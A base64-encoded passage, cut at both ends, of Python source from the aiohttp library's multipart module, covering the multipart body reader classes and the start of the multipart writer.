XIgb3IgZGVmYXVsdC4iIiJcclxuICAgICAgICBjdHlwZSA9IHNlbGYuaGVhZGVycy5nZXQoQ09OVEVOVF9UWVBFLCAiIilcclxuICAgICAgICBtaW1ldHlwZSA9IHBhcnNlX21pbWV0eXBlKGN0eXBlKVxyXG4gICAgICAgIHJldHVybiBtaW1ldHlwZS5wYXJhbWV0ZXJzLmdldCgiY2hhcnNldCIsIGRlZmF1bHQpXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgbmFtZShzZWxmKSAtPiBPcHRpb25hbFtzdHJdOlxyXG4gICAgICAgICIiIlJldHVybnMgbmFtZSBzcGVjaWZpZWQgaW4gQ29udGVudC1EaXNwb3NpdGlvbiBoZWFkZXIuXHJcblxyXG4gICAgICAgIElmIHRoZSBoZWFkZXIgaXMgbWlzc2luZyBvciBtYWxmb3JtZWQsIHJldHVybnMgTm9uZS5cclxuICAgICAgICAiIiJcclxuICAgICAgICBfLCBwYXJhbXMgPSBwYXJzZV9jb250ZW50X2Rpc3Bvc2l0aW9uKHNlbGYuaGVhZGVycy5nZXQoQ09OVEVOVF9ESVNQT1NJVElPTikpXHJcbiAgICAgICAgcmV0dXJuIGNvbnRlbnRfZGlzcG9zaXRpb25fZmlsZW5hbWUocGFyYW1zLCAibmFtZSIpXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgZmlsZW5hbWUoc2VsZikgLT4gT3B0aW9uYWxbc3RyXTpcclxuICAgICAgICAiIiJSZXR1cm5zIGZpbGVuYW1lIHNwZWNpZmllZCBpbiBDb250ZW50LURpc3Bvc2l0aW9uIGhlYWRlci5cclxuXHJcbiAgICAgICAgUmV0dXJucyBOb25lIGlmIHRoZSBoZWFkZXIgaXMgbWlzc2luZyBvciBtYWxmb3JtZWQuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgXywgcGFyYW1zID0gcGFyc2VfY29udGVudF9kaXNwb3NpdGlvbihzZWxmLmhlYWRlcnMuZ2V0KENPTlRFTlRfRElTUE9TSVRJT04pKVxyXG4gICAgICAgIHJldHVybiBjb250ZW50X2Rpc3Bvc2l0aW9uX2ZpbGVuYW1lKHBhcmFtcywgImZpbGVuYW1lIilcclxuXHJcblxyXG5AcGF5bG9hZF90eXBlKEJvZHlQYXJ0UmVhZGVyLCBvcmRlcj1PcmRlci50cnlfZmlyc3QpXHJcbmNsYXNzIEJvZHlQYXJ0UmVhZGVyUGF5bG9hZChQYXlsb2FkKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB2YWx1ZTogQm9keVBhcnRSZWFkZXIsICphcmdzOiBBbnksICoqa3dhcmdzOiBBbnkpIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyh2YWx1ZSwgKmFyZ3MsICoqa3dhcmdzKVxyXG5cclxuICAgICAgICBwYXJhbXMgPSB7fSAgIyB0eXBlOiBEaWN0W3N0ciwgc3RyXVxyXG4gICAgICAgIGlmIHZhbHVlLm5hbWUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHBhcmFtc1sibmFtZSJdID0gdmFsdWUubmFtZVxyXG4gICAgICAgIGlmIHZhbHVlLmZpbGVuYW1lIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBwYXJhbXNbImZpbGVuYW1lIl0gPSB2YWx1ZS5maWxlbmFtZVxyXG5cclxuICAgICAgICBpZiBwYXJhbXM6XHJcbiAgICAgICAgICAgIHNlbGYuc2V0X2NvbnRlbnRfZGlzcG9zaXRpb24oImF0dGFjaG1lbnQiLCBUcnVlLCAqKnBhcmFtcylcclxuXHJcbiAgICBhc3luYyBkZWYgd3JpdGUoc2VsZiwgd3JpdGVyOiBBbnkpIC0+IE5vbmU6XHJcbiAgICAgICAgZmllbGQgPSBzZWxmLl92YWx1ZVxyXG4gICAgICAgIGNodW5rID0gYXdhaXQgZmllbGQucmVhZF9jaHVuayhzaXplPTIgKiogMTYpXHJcbiAgICAgICAgd2hpbGUgY2h1bms6XHJcbiAgICAgICAgICAgIGF3YWl0IHdyaXRlci53cml0ZShmaWVsZC5kZWNvZGUoY2h1bmspKVxyXG4gICAgICAgICAgICBjaHVuayA9IGF3YWl0IGZpZWxkLnJlYWRfY2h1bmsoc2l6ZT0yICoqIDE2KVxyXG5cclxuXHJcbmNsYXNzIE11bHRpcGFydFJlYWRlcjpcclxuICAgICIiIk11bHRpcGFydCBib2R5IHJlYWRlci4iIiJcclxuXHJcbiAgICAjOiBSZXNwb25zZSB3cmFwcGVyLCB1c2VkIHdoZW4gbXVsdGlwYXJ0IHJlYWRlcnMgY29uc3RydWN0cyBmcm9tIHJlc3BvbnNlLlxyXG4gICAgcmVzcG9uc2Vfd3JhcHBlcl9jbHMgPSBNdWx0aXBhcnRSZXNwb25zZVdyYXBwZXJcclxuICAgICM6IE11bHRpcGFydCByZWFkZXIgY2xhc3MsIHVzZWQgdG8gaGFuZGxlIG11bHRpcGFydC8qIGJvZHkgcGFydHMuXHJcbiAgICAjOiBOb25lIHBvaW50cyB0byB0eXBlKHNlbGYpXHJcbiAgICBtdWx0aXBhcnRfcmVhZGVyX2NscyA9IE5vbmVcclxuICAgICM6IEJvZHkgcGFydCByZWFkZXIgY2xhc3MgZm9yIG5vbiBtdWx0aXBhcnQvKiBjb250ZW50IHR5cGVzLlxyXG4gICAgcGFydF9yZWFkZXJfY2xzID0gQm9keVBhcnRSZWFkZXJcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgaGVhZGVyczogTWFwcGluZ1tzdHIsIHN0cl0sIGNvbnRlbnQ6IFN0cmVhbVJlYWRlcikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmhlYWRlcnMgPSBoZWFkZXJzXHJcbiAgICAgICAgc2VsZi5fYm91bmRhcnkgPSAoIi0tIiArIHNlbGYuX2dldF9ib3VuZGFyeSgpKS5lbmNvZGUoKVxyXG4gICAgICAgIHNlbGYuX2NvbnRlbnQgPSBjb250ZW50XHJcbiAgICAgICAgc2VsZi5fbGFzdF9wYXJ0ID0gKFxyXG4gICAgICAgICAgICBOb25lXHJcbiAgICAgICAgKSAgIyB0eXBlOiBPcHRpb25hbFtVbmlvbltcJ011bHRpcGFydFJlYWRlclwnLCBCb2R5UGFydFJlYWRlcl1dXHJcbiAgICAgICAgc2VsZi5fYXRfZW9mID0gRmFsc2VcclxuICAgICAgICBzZWxmLl9hdF9ib2YgPSBUcnVlXHJcbiAgICAgICAgc2VsZi5fdW5yZWFkID0gW10gICMgdHlwZTogTGlzdFtieXRlc11cclxuXHJcbiAgICBkZWYgX19haXRlcl9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+IEFzeW5jSXRlcmF0b3JbIkJvZHlQYXJ0UmVhZGVyIl06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYgICMgdHlwZTogaWdub3JlW3JldHVybi12YWx1ZV1cclxuXHJcbiAgICBhc3luYyBkZWYgX19hbmV4dF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+IE9wdGlvbmFsW1VuaW9uWyJNdWx0aXBhcnRSZWFkZXIiLCBCb2R5UGFydFJlYWRlcl1dOlxyXG4gICAgICAgIHBhcnQgPSBhd2FpdCBzZWxmLm5leHQoKVxyXG4gICAgICAgIGlmIHBhcnQgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgU3RvcEFzeW5jSXRlcmF0aW9uXHJcbiAgICAgICAgcmV0dXJuIHBhcnRcclxuXHJcbiAgICBAY2xhc3NtZXRob2RcclxuICAgIGRlZiBmcm9tX3Jlc3BvbnNlKFxyXG4gICAgICAgIGNscyxcclxuICAgICAgICByZXNwb25zZTogIkNsaWVudFJlc3BvbnNlIixcclxuICAgICkgLT4gTXVsdGlwYXJ0UmVzcG9uc2VXcmFwcGVyOlxyXG4gICAgICAgICIiIkNvbnN0cnVjdHMgcmVhZGVyIGluc3RhbmNlIGZyb20gSFRUUCByZXNwb25zZS5cclxuXHJcbiAgICAgICAgOnBhcmFtIHJlc3BvbnNlOiA6Y2xhc3M6YH5haW9odHRwLmNsaWVudC5DbGllbnRSZXNwb25zZWAgaW5zdGFuY2VcclxuICAgICAgICAiIiJcclxuICAgICAgICBvYmogPSBjbHMucmVzcG9uc2Vfd3JhcHBlcl9jbHMoXHJcbiAgICAgICAgICAgIHJlc3BvbnNlLCBjbHMocmVzcG9uc2UuaGVhZGVycywgcmVzcG9uc2UuY29udGVudClcclxuICAgICAgICApXHJcbiAgICAgICAgcmV0dXJuIG9ialxyXG5cclxuICAgIGRlZiBhdF9lb2Yoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICAiIiJSZXR1cm5zIFRydWUgaWYgdGhlIGZpbmFsIGJvdW5kYXJ5IHdhcyByZWFjaGVkLCBmYWxzZSBvdGhlcndpc2UuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2F0X2VvZlxyXG5cclxuICAgIGFzeW5jIGRlZiBuZXh0KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+IE9wdGlvbmFsW1VuaW9uWyJNdWx0aXBhcnRSZWFkZXIiLCBCb2R5UGFydFJlYWRlcl1dOlxyXG4gICAgICAgICIiIkVtaXRzIHRoZSBuZXh0IG11bHRpcGFydCBib2R5IHBhcnQuIiIiXHJcbiAgICAgICAgIyBTbywgaWYgd2VcJ3JlIGF0IEJPRiwgd2UgbmVlZCB0byBza2lwIHRpbGwgdGhlIGJvdW5kYXJ5LlxyXG4gICAgICAgIGlmIHNlbGYuX2F0X2VvZjpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcclxuICAgICAgICBhd2FpdCBzZWxmLl9tYXliZV9yZWxlYXNlX2xhc3RfcGFydCgpXHJcbiAgICAgICAgaWYgc2VsZi5fYXRfYm9mOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLl9yZWFkX3VudGlsX2ZpcnN0X2JvdW5kYXJ5KClcclxuICAgICAgICAgICAgc2VsZi5fYXRfYm9mID0gRmFsc2VcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLl9yZWFkX2JvdW5kYXJ5KClcclxuICAgICAgICBpZiBzZWxmLl9hdF9lb2Y6ICAjIHdlIGp1c3QgcmVhZCB0aGUgbGFzdCBib3VuZGFyeSwgbm90aGluZyB0byBkbyB0aGVyZVxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG4gICAgICAgIHNlbGYuX2xhc3RfcGFydCA9IGF3YWl0IHNlbGYuZmV0Y2hfbmV4dF9wYXJ0KClcclxuICAgICAgICByZXR1cm4gc2VsZi5fbGFzdF9wYXJ0XHJcblxyXG4gICAgYXN5bmMgZGVmIHJlbGVhc2Uoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICAiIiJSZWFkcyBhbGwgdGhlIGJvZHkgcGFydHMgdG8gdGhlIHZvaWQgdGlsbCB0aGUgZmluYWwgYm91bmRhcnkuIiIiXHJcbiAgICAgICAgd2hpbGUgbm90IHNlbGYuX2F0X2VvZjpcclxuICAgICAgICAgICAgaXRlbSA9IGF3YWl0IHNlbGYubmV4dCgpXHJcbiAgICAgICAgICAgIGlmIGl0ZW0gaXMgTm9uZTpcclxuICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgIGF3YWl0IGl0ZW0ucmVsZWFzZSgpXHJcblxyXG4gICAgYXN5bmMgZGVmIGZldGNoX25leHRfcGFydChcclxuICAgICAgICBzZWxmLFxyXG4gICAgKSAtPiBVbmlvblsiTXVsdGlwYXJ0UmVhZGVyIiwgQm9keVBhcnRSZWFkZXJdOlxyXG4gICAgICAgICIiIlJldHVybnMgdGhlIG5leHQgYm9keSBwYXJ0IHJlYWRlci4iIiJcclxuICAgICAgICBoZWFkZXJzID0gYXdhaXQgc2VsZi5fcmVhZF9oZWFkZXJzKClcclxuICAgICAgICByZXR1cm4gc2VsZi5fZ2V0X3BhcnRfcmVhZGVyKGhlYWRlcnMpXHJcblxyXG4gICAgZGVmIF9nZXRfcGFydF9yZWFkZXIoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBoZWFkZXJzOiAiQ0lNdWx0aURpY3RQcm94eVtzdHJdIixcclxuICAgICkgLT4gVW5pb25bIk11bHRpcGFydFJlYWRlciIsIEJvZHlQYXJ0UmVhZGVyXTpcclxuICAgICAgICAiIiJEaXNwYXRjaGVzIHRoZSByZXNwb25zZSBieSB0aGUgYENvbnRlbnQtVHlwZWAgaGVhZGVyLlxyXG5cclxuICAgICAgICBSZXR1cm5zIGEgc3VpdGFibGUgcmVhZGVyIGluc3RhbmNlLlxyXG5cclxuICAgICAgICA6cGFyYW0gZGljdCBoZWFkZXJzOiBSZXNwb25zZSBoZWFkZXJzXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgY3R5cGUgPSBoZWFkZXJzLmdldChDT05URU5UX1RZUEUsICIiKVxyXG4gICAgICAgIG1pbWV0eXBlID0gcGFyc2VfbWltZXR5cGUoY3R5cGUpXHJcblxyXG4gICAgICAgIGlmIG1pbWV0eXBlLnR5cGUgPT0gIm11bHRpcGFydCI6XHJcbiAgICAgICAgICAgIGlmIHNlbGYubXVsdGlwYXJ0X3JlYWRlcl9jbHMgaXMgTm9uZTpcclxuICAgICAgICAgICAgICAgIHJldHVybiB0eXBlKHNlbGYpKGhlYWRlcnMsIHNlbGYuX2NvbnRlbnQpXHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLm11bHRpcGFydF9yZWFkZXJfY2xzKGhlYWRlcnMsIHNlbGYuX2NvbnRlbnQpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYucGFydF9yZWFkZXJfY2xzKHNlbGYuX2JvdW5kYXJ5LCBoZWFkZXJzLCBzZWxmLl9jb250ZW50KVxyXG5cclxuICAgIGRlZiBfZ2V0X2JvdW5kYXJ5KHNlbGYpIC0+IHN0cjpcclxuICAgICAgICBtaW1ldHlwZSA9IHBhcnNlX21pbWV0eXBlKHNlbGYuaGVhZGVyc1tDT05URU5UX1RZUEVdKVxyXG5cclxuICAgICAgICBhc3NlcnQgbWltZXR5cGUudHlwZSA9PSAibXVsdGlwYXJ0IiwgIm11bHRpcGFydC8qIGNvbnRlbnQgdHlwZSBleHBlY3RlZCJcclxuXHJcbiAgICAgICAgaWYgImJvdW5kYXJ5IiBub3QgaW4gbWltZXR5cGUucGFyYW1ldGVyczpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJib3VuZGFyeSBtaXNzZWQgZm9yIENvbnRlbnQtVHlwZTogJXMiICUgc2VsZi5oZWFkZXJzW0NPTlRFTlRfVFlQRV1cclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBib3VuZGFyeSA9IG1pbWV0eXBlLnBhcmFtZXRlcnNbImJvdW5kYXJ5Il1cclxuICAgICAgICBpZiBsZW4oYm91bmRhcnkpID4gNzA6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoImJvdW5kYXJ5ICVyIGlzIHRvbyBsb25nICg3MCBjaGFycyBtYXgpIiAlIGJvdW5kYXJ5KVxyXG5cclxuICAgICAgICByZXR1cm4gYm91bmRhcnlcclxuXHJcbiAgICBhc3luYyBkZWYgX3JlYWRsaW5lKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIHNlbGYuX3VucmVhZDpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX3VucmVhZC5wb3AoKVxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl9jb250ZW50LnJlYWRsaW5lKClcclxuXHJcbiAgICBhc3luYyBkZWYgX3JlYWRfdW50aWxfZmlyc3RfYm91bmRhcnkoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICB3aGlsZSBUcnVlOlxyXG4gICAgICAgICAgICBjaHVuayA9IGF3YWl0IHNlbGYuX3JlYWRsaW5lKClcclxuICAgICAgICAgICAgaWYgY2h1bmsgPT0gYiIiOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiQ291bGQgbm90IGZpbmQgc3RhcnRpbmcgYm91bmRhcnkgJXIiICUgKHNlbGYuX2JvdW5kYXJ5KVxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBjaHVuayA9IGNodW5rLnJzdHJpcCgpXHJcbiAgICAgICAgICAgIGlmIGNodW5rID09IHNlbGYuX2JvdW5kYXJ5OlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuXHJcbiAgICAgICAgICAgIGVsaWYgY2h1bmsgPT0gc2VsZi5fYm91bmRhcnkgKyBiIi0tIjpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2F0X2VvZiA9IFRydWVcclxuICAgICAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgIGFzeW5jIGRlZiBfcmVhZF9ib3VuZGFyeShzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGNodW5rID0gKGF3YWl0IHNlbGYuX3JlYWRsaW5lKCkpLnJzdHJpcCgpXHJcbiAgICAgICAgaWYgY2h1bmsgPT0gc2VsZi5fYm91bmRhcnk6XHJcbiAgICAgICAgICAgIHBhc3NcclxuICAgICAgICBlbGlmIGNodW5rID09IHNlbGYuX2JvdW5kYXJ5ICsgYiItLSI6XHJcbiAgICAgICAgICAgIHNlbGYuX2F0X2VvZiA9IFRydWVcclxuICAgICAgICAgICAgZXBpbG9ndWUgPSBhd2FpdCBzZWxmLl9yZWFkbGluZSgpXHJcbiAgICAgICAgICAgIG5leHRfbGluZSA9IGF3YWl0IHNlbGYuX3JlYWRsaW5lKClcclxuXHJcbiAgICAgICAgICAgICMgdGhlIGVwaWxvZ3VlIGlzIGV4cGVjdGVkIGFuZCB0aGVuIGVpdGhlciB0aGUgZW5kIG9mIGlucHV0IG9yIHRoZVxyXG4gICAgICAgICAgICAjIHBhcmVudCBtdWx0aXBhcnQgYm91bmRhcnksIGlmIHRoZSBwYXJlbnQgYm91bmRhcnkgaXMgZm91bmQgdGhlblxyXG4gICAgICAgICAgICAjIGl0IHNob3VsZCBiZSBtYXJrZWQgYXMgdW5yZWFkIGFuZCBoYW5kZWQgdG8gdGhlIHBhcmVudCBmb3JcclxuICAgICAgICAgICAgIyBwcm9jZXNzaW5nXHJcbiAgICAgICAgICAgIGlmIG5leHRfbGluZVs6Ml0gPT0gYiItLSI6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl91bnJlYWQuYXBwZW5kKG5leHRfbGluZSlcclxuICAgICAgICAgICAgIyBvdGhlcndpc2UgdGhlIHJlcXVlc3QgaXMgbGlrZWx5IG1pc3NpbmcgYW4gZXBpbG9ndWUgYW5kIGJvdGhcclxuICAgICAgICAgICAgIyBsaW5lcyBzaG91bGQgYmUgcGFzc2VkIHRvIHRoZSBwYXJlbnQgZm9yIHByb2Nlc3NpbmdcclxuICAgICAgICAgICAgIyAodGhpcyBoYW5kbGVzIHRoZSBvbGQgYmVoYXZpb3IgZ3JhY2VmdWxseSlcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHNlbGYuX3VucmVhZC5leHRlbmQoW25leHRfbGluZSwgZXBpbG9ndWVdKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoZiJJbnZhbGlkIGJvdW5kYXJ5IHtjaHVuayFyfSwgZXhwZWN0ZWQge3NlbGYuX2JvdW5kYXJ5IXJ9IilcclxuXHJcbiAgICBhc3luYyBkZWYgX3JlYWRfaGVhZGVycyhzZWxmKSAtPiAiQ0lNdWx0aURpY3RQcm94eVtzdHJdIjpcclxuICAgICAgICBsaW5lcyA9IFtiIiJdXHJcbiAgICAgICAgd2hpbGUgVHJ1ZTpcclxuICAgICAgICAgICAgY2h1bmsgPSBhd2FpdCBzZWxmLl9jb250ZW50LnJlYWRsaW5lKClcclxuICAgICAgICAgICAgY2h1bmsgPSBjaHVuay5zdHJpcCgpXHJcbiAgICAgICAgICAgIGxpbmVzLmFwcGVuZChjaHVuaylcclxuICAgICAgICAgICAgaWYgbm90IGNodW5rOlxyXG4gICAgICAgICAgICAgICAgYnJlYWtcclxuICAgICAgICBwYXJzZXIgPSBIZWFkZXJzUGFyc2VyKClcclxuICAgICAgICBoZWFkZXJzLCByYXdfaGVhZGVycyA9IHBhcnNlci5wYXJzZV9oZWFkZXJzKGxpbmVzKVxyXG4gICAgICAgIHJldHVybiBoZWFkZXJzXHJcblxyXG4gICAgYXN5bmMgZGVmIF9tYXliZV9yZWxlYXNlX2xhc3RfcGFydChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgICIiIkVuc3VyZXMgdGhhdCB0aGUgbGFzdCByZWFkIGJvZHkgcGFydCBpcyByZWFkIGNvbXBsZXRlbHkuIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fbGFzdF9wYXJ0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBpZiBub3Qgc2VsZi5fbGFzdF9wYXJ0LmF0X2VvZigpOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5fbGFzdF9wYXJ0LnJlbGVhc2UoKVxyXG4gICAgICAgICAgICBzZWxmLl91bnJlYWQuZXh0ZW5kKHNlbGYuX2xhc3RfcGFydC5fdW5yZWFkKVxyXG4gICAgICAgICAgICBzZWxmLl9sYXN0X3BhcnQgPSBOb25lXHJcblxyXG5cclxuX1BhcnQgPSBUdXBsZVtQYXlsb2FkLCBzdHIsIHN0cl1cclxuXHJcblxyXG5jbGFzcyBNdWx0aXBhcnRXcml0ZXIoUGF5bG9hZCk6XHJcbiAgICAiIiJNdWx0aXBhcnQgYm9keSB3cml0ZXIuIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHN1YnR5cGU6IHN0ciA9ICJtaXhlZCIsIGJvdW5kYXJ5OiBPcHRpb25hbFtzdHJdID0gTm9uZSkgLT4gTm9uZTpcclxuICAgICAgICBib3VuZGFyeSA9IGJvdW5kYXJ5IGlmIGJvdW5kYXJ5IGlzIG5vdCBOb25lIGVsc2UgdXVpZC51dWlkNCgpLmhleFxyXG4gICAgICAgICMgVGhlIHVuZGVybHlpbmcgUGF5bG9hZCBBUEkgZGVtYW5kcyBhIHN0ciAodXRmLTgpLCBub3QgYnl0ZXMsXHJcbiAgICAgICAgIyBzbyB3ZSBuZWVkIHRvIGVuc3VyZSB3ZSBkb25cJ3QgbG9zZSBhbnl0aGluZyBkdXJpbmcgY29udmVyc2lvbi5cclxuICAgICAgICAjIEFzIGEgcmVzdWx0LCByZXF1aXJlIHRoZSBib3VuZGFyeSB0byBiZSBBU0NJSSBvbmx5LlxyXG4gICAgICAgICMgSW4gYm90aCBzaXR1YXRpb25zLlxyXG5cclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHNlbGYuX2JvdW5kYXJ5ID0gYm91bmRhcnkuZW5jb2RlKCJhc2NpaSIpXHJcbiAgICAgICAgZXhjZXB0IFVuaWNvZGVFbmNvZGVFcnJvcjpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiYm91bmRhcnkgc2hvdWxkIGNvbnRhaW4gQVNDSUkgb25seSBjaGFycyIpIGZyb20gTm9uZVxyXG4gICAgICAgIGN0eXBlID0gZiJtdWx0aXBhcnQve3N1YnR5cGV9OyBib3VuZGFyeT17c2VsZi5fYm91bmRhcnlfdmFsdWV9IlxyXG5cclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKE5vbmUsIGNvbnRlbnRfdHlwZT1jdHlwZSlcclxuXHJcbiAgICAgICAgc2VsZi5fcGFydHMgPSBbXSAgIyB0eXBlOiBMaXN0W19QYXJ0XVxyXG5cclxuICAgIGRlZiBfX2VudGVyX18oc2VsZikgLT4gIk11bHRpcGFydFdyaXRlciI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGZcclxuXHJcbiAgICBkZWYgX19leGl0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBleGNfdHlwZTogT3B0aW9uYWxbVHlwZVtCYXNlRXhjZXB0aW9uXV0sXHJcbiAgICAgICAgZXhjX3ZhbDogT3B0aW9uYWxbQmFzZUV4Y2VwdGlvbl0sXHJcbiAgICAgICAgZXhjX3RiOiBPcHRpb25hbFtUcmFjZWJhY2tUeXBlXSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBwYXNzXHJcblxyXG4gICAgZGVmIF9faXRlcl9fKHNlbGYpIC0+IEl0ZXJhdG9yW19QYXJ0XTpcclxuICAgICAgICByZXR1cm4gaXRlcihzZWxmLl9wYXJ0cylcclxuXHJcbiAgICBkZWYgX19sZW5fXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLl9wYXJ0cylcclxuXHJcbiAgICBkZWYgX19ib29sX18oc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gVHJ1ZVxyXG5cclxuICAgIF92YWxpZF90Y2hhcl9yZWdleCA9IHJlLmNvbXBpbGUoYnIiXFxBWyEjJCUmXCcqK1xcLS5eX2B8flxcd10rXFxaIilcclxuICAgIF9pbnZhbGlkX3FkdGV4dF9jaGFyX3JlZ2V4ID0gcmUuY29tcGlsZShiciJbXFx4MDAtXFx4MDhcXHgwQS1cXHgxRlxceDdGXSIpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgX2JvdW5kYXJ5X3ZhbHVlKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICAiIiJXcmFwIGJvdW5kYXJ5IHBhcmFtZXRlciB2YWx1ZSBpbiBxdW90ZXMsIGlmIG5lY2Vzc2FyeS5cclxuXHJcbiAgICAgICAgUmVhZHMgc2VsZi5ib3VuZGFyeSBhbmQgcmV0dXJucyBhIHVuaWNvZGUgc3RpbmcuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgIyBSZWZlciB0byBSRkNzIDcyMzEsIDcyMzAsIDUyMzQuXHJcbiAgICAgICAgI1xyXG4gICAgICAgICMgcGFyYW1ldGVyICAgICAgPSB0b2tlbiAiPSIgKCB0b2tlbiAvIHF1b3RlZC1zdHJpbmcgKVxyXG4gICAgICAgICMgdG9rZW4gICAgICAgICAgPSAxKnRjaGFyXHJcbiAgICAgICAgIyBxdW90ZWQtc3RyaW5nICA9IERRVU9URSAqKCBxZHRleHQgLyBxdW90ZWQtcGFpciApIERRVU9URVxyXG4gICAgICAgICMgcWR0ZXh0ICAgICAgICAgPSBIVEFCIC8gU1AgLyAleDIxIC8gJXgyMy01QiAvICV4NUQtN0UgLyBvYnMtdGV4dFxyXG4gICAgICAgICMgb2JzLXRleHQgICAgICAgPSAleDgwLUZGXHJcbiAgICAgICAgIyBxdW90ZWQtcGFpciAgICA9ICJcXCIgKCBIVEFCIC8gU1AgLyBWQ0hBUiAvIG9icy10ZXh0IClcclxuICAgICAgICAjIHRjaGFyICAgICAgICAgID0gIiEiIC8gIiMiIC8gIiQiIC8gIiUiIC8gIiYiIC8gIlwnIiAvICIqIlxyXG4gICAgICAgICMgICAgICAgICAgICAgICAgICAvICIrIiAvICItIiAvICIuIiAvICJeIiAvICJfIiAvICJgIiAvICJ8IiAvICJ+IlxyXG4gICAgICAgICMgICAgICAgICAgICAgICAgICAvIERJR0lUIC8gQUxQSEFcclxuICAgICAgICAjICAgICAgICAgICAgICAgICAgOyBhbnkgVkNIQVIsIGV4Y2VwdCBkZWxpbWl0ZXJzXHJcbiAgICAgICAgIyBWQ0hBUiAgICAgICAgICAgPSAleDIxLTdFXHJcbiAgICAgICAgdmFsdWUgPSBzZWxmLl9ib3VuZGFyeVxyXG4gICAgICAgIGlmIHJlLm1hdGNoKHNlbGYuX3ZhbGlkX3RjaGFyX3JlZ2V4LCB2YWx1ZSk6XHJcbiAgICAgICAgICAgIHJldHVybiB2YWx1ZS5kZWNvZGUoImFzY2lpIikgICMgY2Fubm90IGZhaWxcclxuXHJcbiAgICAgICAgaWYgcmUuc2VhcmNoKHNlbGYuX2ludmFsaWRfcWR0ZXh0X2NoYXJfcmVnZXgsIHZhbHVlKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiYm91bmRhcnkgdmFsdWUgY29udGFpbnMgaW52YWxpZCBjaGFyYWN0ZXJzIilcclxuXHJcbiAgICAgICAgIyBlc2NhcGUgJXg1QyBhbmQgJXgyMlxyXG4gICAgICAgIHF1b3RlZF92YWx1ZV9jb250ZW50ID0gdmFsdWUucmVwbGFjZShiIlxcXFwiLCBiIlxcXFxcXFxcIilcclxuICAgICAgICBxdW90ZWRfdmFsdWVfY29udGVudCA9IHF1b3RlZF92YWx1ZV9jb250ZW50LnJlcGxhY2UoYlwnIlwnLCBiXCdcXFxcIlwnKVxyXG5cclxuICAgICAgICByZXR1cm4gXCciXCcgKyBxdW90ZWRfdmFsdWVfY29udGVudC5kZWNvZGUoImFzY2lpIikgKyBcJyJcJ1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGJvdW5kYXJ5KHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fYm91bmRhcnkuZGVjb2RlKCJhc2NpaSIpXHJcblxyXG4gICAgZGVmIGFwcGVuZChzZWxmLCBvYmo6IEFueSwgaGVhZGVyczogT3B0aW9uYWxbTXVsdGlNYXBwaW5nW3N0cl1dID0gTm9uZSkgLT4gUGF5bG9hZDpcclxuICAgICAgICBpZiBoZWFk